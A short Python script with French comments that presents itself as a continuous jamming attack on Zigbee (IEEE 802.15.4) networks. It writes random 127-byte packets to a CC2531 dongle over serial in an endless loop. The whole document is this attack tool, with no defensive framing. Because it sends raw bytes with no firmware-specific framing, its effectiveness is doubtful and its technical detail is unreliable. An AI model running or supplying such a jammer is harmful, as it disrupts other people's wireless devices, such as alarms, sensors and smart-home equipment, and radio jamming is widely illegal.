import serial
import random
import time

# Ouvrir la connexion série avec le CC2531
ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=1)

# Fonction pour générer un paquet de brouillage aléatoire
def generate_jamming_packet():
    # Génère un paquet IEEE 802.15.4 aléatoire
    # Ce paquet peut être ajusté selon les besoins du protocole Zigbee
    packet = bytearray([random.randint(0, 255) for _ in range(127)])  # Exemple de 127 octets
    return packet

# Fonction pour envoyer un paquet de brouillage
def send_jamming_packet():
    packet = generate_jamming_packet()
    ser.write(packet)  # Envoi du paquet

# Attaque de brouillage continue
try:
    while True:
        send_jamming_packet()  # Envoi continu de paquets
        time.sleep(0.1)  # Pause de 100ms entre chaque envoi (peut être ajusté)
except KeyboardInterrupt:
    print("Attaque de brouillage arrêtée.")
    ser.close()
